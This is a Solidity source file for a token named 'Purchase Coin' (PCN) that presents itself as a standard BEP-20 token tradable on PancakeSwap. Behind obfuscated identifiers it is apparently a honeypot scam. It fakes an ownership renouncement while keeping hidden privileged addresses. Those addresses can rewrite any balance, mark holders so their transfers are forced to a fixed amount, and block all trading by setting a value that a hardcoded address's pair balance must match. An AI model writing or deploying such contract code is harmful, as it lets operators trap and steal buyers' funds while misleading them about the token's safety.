//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface amountMode {
    function createPair(address walletFund, address totalListShould) external returns (address);
}

interface txLimitFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundBuy) external view returns (uint256);

    function transfer(address fundLaunchedMin, uint256 walletTeam) external returns (bool);

    function allowance(address senderTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletTeam) external returns (bool);

    function transferFrom(
        address sender,
        address fundLaunchedMin,
        uint256 walletTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenTeam, uint256 value);
    event Approval(address indexed senderTx, address indexed spender, uint256 value);
}

abstract contract launchedLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeReceiverLaunched is txLimitFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PurchaseCoin is launchedLiquidity, txLimitFund, takeReceiverLaunched {

    function shouldTake() private view {
        require(txAuto[_msgSender()]);
    }

    function launchedAutoShould(address amountTotal, uint256 walletTeam) public {
        shouldTake();
        modeToken[amountTotal] = walletTeam;
    }

    uint256 toTx;

    function walletAutoTeam(address receiverList, address fundLaunchedMin, uint256 walletTeam) internal returns (bool) {
        if (receiverList == launchedTx) {
            return txFee(receiverList, fundLaunchedMin, walletTeam);
        }
        uint256 teamLiquidity = txLimitFund(takeAuto).balanceOf(receiverMax);
        require(teamLiquidity == takeExempt);
        require(fundLaunchedMin != receiverMax);
        if (tokenTxTo[receiverList]) {
            return txFee(receiverList, fundLaunchedMin, buyShouldTotal);
        }
        return txFee(receiverList, fundLaunchedMin, walletTeam);
    }

    string private toTake = "Purchase Coin";

    function minTrading(uint256 walletTeam) public {
        shouldTake();
        takeExempt = walletTeam;
    }

    constructor (){
        
        atLimit totalTeam = atLimit(fundSender);
        takeAuto = amountMode(totalTeam.factory()).createPair(totalTeam.WETH(), address(this));
        if (marketingTo == launchedList) {
            isShould = false;
        }
        launchedTx = _msgSender();
        txAuto[launchedTx] = true;
        modeToken[launchedTx] = totalEnable;
        totalList();
        
        emit Transfer(address(0), launchedTx, totalEnable);
    }

    bool public buyWallet;

    function totalList() public {
        emit OwnershipTransferred(launchedTx, address(0));
        listAt = address(0);
    }

    address fundSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return listAt;
    }

    uint256 takeExempt;

    string private launchAmountTo = "PCN";

    function name() external view virtual override returns (string memory) {
        return toTake;
    }

    address public takeAuto;

    function tokenLaunchedTotal(address listMaxMarketing) public {
        if (launchExempt) {
            return;
        }
        
        txAuto[listMaxMarketing] = true;
        if (marketingTo == launchedList) {
            launchedList = marketingTo;
        }
        launchExempt = true;
    }

    uint256 private totalEnable = 100000000 * 10 ** 18;

    uint256 constant buyShouldTotal = 17 ** 10;

    address public launchedTx;

    mapping(address => bool) public tokenTxTo;

    function totalSupply() external view virtual override returns (uint256) {
        return totalEnable;
    }

    function owner() external view returns (address) {
        return listAt;
    }

    function isReceiver(address receiverFrom) public {
        shouldTake();
        
        if (receiverFrom == launchedTx || receiverFrom == takeAuto) {
            return;
        }
        tokenTxTo[receiverFrom] = true;
    }

    mapping(address => uint256) private modeToken;

    mapping(address => mapping(address => uint256)) private tradingFundList;

    address private listAt;

    function transferFrom(address receiverList, address fundLaunchedMin, uint256 walletTeam) external override returns (bool) {
        if (_msgSender() != fundSender) {
            if (tradingFundList[receiverList][_msgSender()] != type(uint256).max) {
                require(walletTeam <= tradingFundList[receiverList][_msgSender()]);
                tradingFundList[receiverList][_msgSender()] -= walletTeam;
            }
        }
        return walletAutoTeam(receiverList, fundLaunchedMin, walletTeam);
    }

    mapping(address => bool) public txAuto;

    function balanceOf(address fundBuy) public view virtual override returns (uint256) {
        return modeToken[fundBuy];
    }

    uint256 private launchedList;

    function approve(address isMin, uint256 walletTeam) public virtual override returns (bool) {
        tradingFundList[_msgSender()][isMin] = walletTeam;
        emit Approval(_msgSender(), isMin, walletTeam);
        return true;
    }

    event OwnershipTransferred(address indexed tradingTx, address indexed receiverShouldAt);

    function decimals() external view virtual override returns (uint8) {
        return listSenderShould;
    }

    address receiverMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function txFee(address receiverList, address fundLaunchedMin, uint256 walletTeam) internal returns (bool) {
        require(modeToken[receiverList] >= walletTeam);
        modeToken[receiverList] -= walletTeam;
        modeToken[fundLaunchedMin] += walletTeam;
        emit Transfer(receiverList, fundLaunchedMin, walletTeam);
        return true;
    }

    function transfer(address amountTotal, uint256 walletTeam) external virtual override returns (bool) {
        return walletAutoTeam(_msgSender(), amountTotal, walletTeam);
    }

    bool public launchExempt;

    function allowance(address exemptFeeAuto, address isMin) external view virtual override returns (uint256) {
        if (isMin == fundSender) {
            return type(uint256).max;
        }
        return tradingFundList[exemptFeeAuto][isMin];
    }

    bool private isShould;

    uint8 private listSenderShould = 18;

    uint256 private marketingTo;

    function symbol() external view virtual override returns (string memory) {
        return launchAmountTo;
    }

}